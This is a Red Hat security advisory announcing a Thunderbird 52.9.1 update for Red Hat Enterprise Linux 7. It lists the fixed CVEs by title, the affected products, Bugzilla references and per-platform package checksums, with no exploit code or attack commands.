* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Important: thunderbird security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2018%3A2252)

## Topic

An update for thunderbird is now available for Red Hat Enterprise Linux 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Mozilla Thunderbird is a standalone mail and newsgroup client.

This update upgrades Thunderbird to version 52.9.1.

Security Fix(es):

* Mozilla: Memory safety bugs fixed in Firefox 61, Firefox ESR 60.1, and Firefox ESR 52.9 (CVE-2018-5188)
* Mozilla: Buffer overflow using computed size of canvas element (CVE-2018-12359)
* Mozilla: Use-after-free using focus() (CVE-2018-12360)
* Mozilla: Integer overflow in SSSE3 scaler (CVE-2018-12362)
* Mozilla: Use-after-free when appending DOM nodes (CVE-2018-12363)
* Mozilla: CSRF attacks through 307 redirects and NPAPI plugins (CVE-2018-12364)
* thunderbird: S/MIME and PGP decryption oracles can be built with HTML emails (CVE-2018-12372)
* thunderbird: S/MIME plaintext can be leaked through HTML reply/forward (CVE-2018-12373)
* Mozilla: Compromised IPC child process can list local filenames (CVE-2018-12365)
* Mozilla: Invalid data handling during QCMS transformations (CVE-2018-12366)
* thunderbird: Using form to exfiltrate encrypted mail part by pressing enter in form field (CVE-2018-12374)

For more details about the security issue(s), including the impact, a CVSS score, and other related information, refer to the CVE page(s) listed in the References section.

Red Hat would like to thank the Mozilla project for reporting these issues. Upstream acknowledges Alex Gaynor, Christoph Diehl, Christian Holler, Jason Kratzer, David Major, Jon Coppeard, Nicolas B. Pierron, Marcia Knous, Ronald Crane, Nils, F. Alonso (revskills), David Black, and OSS-Fuzz as the original reporters.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

All running instances of Thunderbird must be restarted for the update to take effect.

## Affected Products

* Red Hat Enterprise Linux Server 7 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.7 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.6 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.5 x86\_64
* Red Hat Enterprise Linux Server - AUS 7.7 x86\_64
* Red Hat Enterprise Linux Server - AUS 7.6 x86\_64
* Red Hat Enterprise Linux Server - Extended Life Cycle Support 7 x86\_64
* Red Hat Enterprise Linux Workstation 7 x86\_64
* Red Hat Enterprise Linux Desktop 7 x86\_64
* Red Hat Enterprise Linux for Power, little endian 7 ppc64le
* Red Hat Enterprise Linux for Power, little endian - Extended Update Support 7.7 ppc64le
* Red Hat Enterprise Linux for Power, little endian - Extended Update Support 7.6 ppc64le
* Red Hat Enterprise Linux for Power, little endian - Extended Update Support 7.5 ppc64le
* Red Hat Enterprise Linux Server - TUS 7.7 x86\_64
* Red Hat Enterprise Linux Server - TUS 7.6 x86\_64
* Red Hat Enterprise Linux for ARM 64 7 aarch64
* Red Hat Enterprise Linux for Power 9 7 ppc64le
* Red Hat Enterprise Linux Server for Power LE - Update Services for SAP Solutions 7.7 ppc64le
* Red Hat Enterprise Linux Server for Power LE - Update Services for SAP Solutions 7.6 ppc64le
* Red Hat Enterprise Linux for x86\_64 - Update Services for SAP Solutions 7.7 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Update Services for SAP Solutions 7.6 x86\_64
* Red Hat Enterprise Linux Server - Extended Life Cycle Support for IBM Power, little endian 7 ppc64le

## Fixes

* [BZ - 1595024](https://bugzilla.redhat.com/show_bug.cgi?id=1595024)
  - CVE-2018-12359 Mozilla: Buffer overflow using computed size of canvas element
* [BZ - 1595025](https://bugzilla.redhat.com/show_bug.cgi?id=1595025)
  - CVE-2018-12360 Mozilla: Use-after-free using focus()
* [BZ - 1595027](https://bugzilla.redhat.com/show_bug.cgi?id=1595027)
  - CVE-2018-12362 Mozilla: Integer overflow in SSSE3 scaler
* [BZ - 1595028](https://bugzilla.redhat.com/show_bug.cgi?id=1595028)
  - CVE-2018-12363 Mozilla: Use-after-free when appending DOM nodes
* [BZ - 1595029](https://bugzilla.redhat.com/show_bug.cgi?id=1595029)
  - CVE-2018-12364 Mozilla: CSRF attacks through 307 redirects and NPAPI plugins
* [BZ - 1595030](https://bugzilla.redhat.com/show_bug.cgi?id=1595030)
  - CVE-2018-12365 Mozilla: Compromised IPC child process can list local filenames
* [BZ - 1595031](https://bugzilla.redhat.com/show_bug.cgi?id=1595031)
  - CVE-2018-12366 Mozilla: Invalid data handling during QCMS transformations
* [BZ - 1595040](https://bugzilla.redhat.com/show_bug.cgi?id=1595040)
  - CVE-2018-5188 Mozilla: Memory safety bugs fixed in Firefox 61, Firefox ESR 60.1, and Firefox ESR 52.9
* [BZ - 1598529](https://bugzilla.redhat.com/show_bug.cgi?id=1598529)
  - CVE-2018-12373 thunderbird: S/MIME plaintext can be leaked through HTML reply/forward
* [BZ - 1598538](https://bugzilla.redhat.com/show_bug.cgi?id=1598538)
  - CVE-2018-12372 thunderbird: S/MIME and PGP decryption oracles can be built with HTML emails
* [BZ - 1598543](https://bugzilla.redhat.com/show_bug.cgi?id=1598543)
  - CVE-2018-12374 thunderbird: Using form to exfiltrate encrypted mail part by pressing enter in form field

## CVEs

* [CVE-2018-5188](https://www.redhat.com/security/data/cve/CVE-2018-5188.html)
* [CVE-2018-12359](https://www.redhat.com/security/data/cve/CVE-2018-12359.html)
* [CVE-2018-12360](https://www.redhat.com/security/data/cve/CVE-2018-12360.html)
* [CVE-2018-12362](https://www.redhat.com/security/data/cve/CVE-2018-12362.html)
* [CVE-2018-12363](https://www.redhat.com/security/data/cve/CVE-2018-12363.html)
* [CVE-2018-12364](https://www.redhat.com/security/data/cve/CVE-2018-12364.html)
* [CVE-2018-12365](https://www.redhat.com/security/data/cve/CVE-2018-12365.html)
* [CVE-2018-12366](https://www.redhat.com/security/data/cve/CVE-2018-12366.html)
* [CVE-2018-12372](https://www.redhat.com/security/data/cve/CVE-2018-12372.html)
* [CVE-2018-12373](https://www.redhat.com/security/data/cve/CVE-2018-12373.html)
* [CVE-2018-12374](https://www.redhat.com/security/data/cve/CVE-2018-12374.html)

## References

* <https://access.redhat.com/security/updates/classification/#important>
* <https://www.mozilla.org/en-US/security/advisories/mfsa2018-18/>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## Red Hat Enterprise Linux Server 7

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| x86\_64 | |
| thunderbird-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: db23c0c6109ff9f9a9e34b00299cd7baf8572d1bca74728a592b424d551e1be6 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: 87daf555b556c25c88066b74515dd790c5029b55ae5f6ef13e3e3aa4c243c3cf |

## Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.7

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| x86\_64 | |
| thunderbird-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: db23c0c6109ff9f9a9e34b00299cd7baf8572d1bca74728a592b424d551e1be6 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: 87daf555b556c25c88066b74515dd790c5029b55ae5f6ef13e3e3aa4c243c3cf |

## Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| x86\_64 | |
| thunderbird-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: db23c0c6109ff9f9a9e34b00299cd7baf8572d1bca74728a592b424d551e1be6 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: 87daf555b556c25c88066b74515dd790c5029b55ae5f6ef13e3e3aa4c243c3cf |

## Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.5

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| x86\_64 | |
| thunderbird-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: db23c0c6109ff9f9a9e34b00299cd7baf8572d1bca74728a592b424d551e1be6 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: 87daf555b556c25c88066b74515dd790c5029b55ae5f6ef13e3e3aa4c243c3cf |

## Red Hat Enterprise Linux Server - AUS 7.7

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| x86\_64 | |
| thunderbird-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: db23c0c6109ff9f9a9e34b00299cd7baf8572d1bca74728a592b424d551e1be6 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: 87daf555b556c25c88066b74515dd790c5029b55ae5f6ef13e3e3aa4c243c3cf |

## Red Hat Enterprise Linux Server - AUS 7.6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| x86\_64 | |
| thunderbird-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: db23c0c6109ff9f9a9e34b00299cd7baf8572d1bca74728a592b424d551e1be6 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: 87daf555b556c25c88066b74515dd790c5029b55ae5f6ef13e3e3aa4c243c3cf |

## Red Hat Enterprise Linux Server - Extended Life Cycle Support 7

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| x86\_64 | |
| thunderbird-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: db23c0c6109ff9f9a9e34b00299cd7baf8572d1bca74728a592b424d551e1be6 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: 87daf555b556c25c88066b74515dd790c5029b55ae5f6ef13e3e3aa4c243c3cf |

## Red Hat Enterprise Linux Workstation 7

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| x86\_64 | |
| thunderbird-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: db23c0c6109ff9f9a9e34b00299cd7baf8572d1bca74728a592b424d551e1be6 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: 87daf555b556c25c88066b74515dd790c5029b55ae5f6ef13e3e3aa4c243c3cf |

## Red Hat Enterprise Linux Desktop 7

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| x86\_64 | |
| thunderbird-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: db23c0c6109ff9f9a9e34b00299cd7baf8572d1bca74728a592b424d551e1be6 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: 87daf555b556c25c88066b74515dd790c5029b55ae5f6ef13e3e3aa4c243c3cf |

## Red Hat Enterprise Linux for Power, little endian 7

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| ppc64le | |
| thunderbird-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 2a699a790c509fc1a9a8c6c061a832e2486b4cf4c91f91158c7263f7e9756004 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 69cad3d2bfb74203acfa8ba4419711d4155de564a238ac44872151ad0c75208c |

## Red Hat Enterprise Linux for Power, little endian - Extended Update Support 7.7

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| ppc64le | |
| thunderbird-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 2a699a790c509fc1a9a8c6c061a832e2486b4cf4c91f91158c7263f7e9756004 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 69cad3d2bfb74203acfa8ba4419711d4155de564a238ac44872151ad0c75208c |

## Red Hat Enterprise Linux for Power, little endian - Extended Update Support 7.6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| ppc64le | |
| thunderbird-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 2a699a790c509fc1a9a8c6c061a832e2486b4cf4c91f91158c7263f7e9756004 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 69cad3d2bfb74203acfa8ba4419711d4155de564a238ac44872151ad0c75208c |

## Red Hat Enterprise Linux for Power, little endian - Extended Update Support 7.5

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| ppc64le | |
| thunderbird-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 2a699a790c509fc1a9a8c6c061a832e2486b4cf4c91f91158c7263f7e9756004 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 69cad3d2bfb74203acfa8ba4419711d4155de564a238ac44872151ad0c75208c |

## Red Hat Enterprise Linux Server - TUS 7.7

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| x86\_64 | |
| thunderbird-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: db23c0c6109ff9f9a9e34b00299cd7baf8572d1bca74728a592b424d551e1be6 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: 87daf555b556c25c88066b74515dd790c5029b55ae5f6ef13e3e3aa4c243c3cf |

## Red Hat Enterprise Linux Server - TUS 7.6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| x86\_64 | |
| thunderbird-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: db23c0c6109ff9f9a9e34b00299cd7baf8572d1bca74728a592b424d551e1be6 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: 87daf555b556c25c88066b74515dd790c5029b55ae5f6ef13e3e3aa4c243c3cf |

## Red Hat Enterprise Linux for ARM 64 7

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| aarch64 | |
| thunderbird-52.9.1-1.el7\_5.aarch64.rpm | SHA-256: d0cf28f5bbe88406f887fc1f4e5e5bdd68287fd39a21092e3561bc440f081eb3 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.aarch64.rpm | SHA-256: 5b731a83805bcb687329c31b0df803ba78eff2aede43ee60eb3e282c562dc1d3 |

## Red Hat Enterprise Linux for Power 9 7

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| ppc64le | |
| thunderbird-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 2a699a790c509fc1a9a8c6c061a832e2486b4cf4c91f91158c7263f7e9756004 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 69cad3d2bfb74203acfa8ba4419711d4155de564a238ac44872151ad0c75208c |

## Red Hat Enterprise Linux Server for Power LE - Update Services for SAP Solutions 7.7

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| ppc64le | |
| thunderbird-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 2a699a790c509fc1a9a8c6c061a832e2486b4cf4c91f91158c7263f7e9756004 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 69cad3d2bfb74203acfa8ba4419711d4155de564a238ac44872151ad0c75208c |

## Red Hat Enterprise Linux Server for Power LE - Update Services for SAP Solutions 7.6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| ppc64le | |
| thunderbird-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 2a699a790c509fc1a9a8c6c061a832e2486b4cf4c91f91158c7263f7e9756004 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 69cad3d2bfb74203acfa8ba4419711d4155de564a238ac44872151ad0c75208c |

## Red Hat Enterprise Linux for x86\_64 - Update Services for SAP Solutions 7.7

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| x86\_64 | |
| thunderbird-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: db23c0c6109ff9f9a9e34b00299cd7baf8572d1bca74728a592b424d551e1be6 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: 87daf555b556c25c88066b74515dd790c5029b55ae5f6ef13e3e3aa4c243c3cf |

## Red Hat Enterprise Linux for x86\_64 - Update Services for SAP Solutions 7.6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| x86\_64 | |
| thunderbird-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: db23c0c6109ff9f9a9e34b00299cd7baf8572d1bca74728a592b424d551e1be6 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.x86\_64.rpm | SHA-256: 87daf555b556c25c88066b74515dd790c5029b55ae5f6ef13e3e3aa4c243c3cf |

## Red Hat Enterprise Linux Server - Extended Life Cycle Support for IBM Power, little endian 7

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el7\_5.src.rpm | SHA-256: 15fdad64c56b2b6956e38e68486778bbd2e4295ae4098791965cdc59bff2e6aa |
| ppc64le | |
| thunderbird-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 2a699a790c509fc1a9a8c6c061a832e2486b4cf4c91f91158c7263f7e9756004 |
| thunderbird-debuginfo-52.9.1-1.el7\_5.ppc64le.rpm | SHA-256: 69cad3d2bfb74203acfa8ba4419711d4155de564a238ac44872151ad0c75208c |

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)


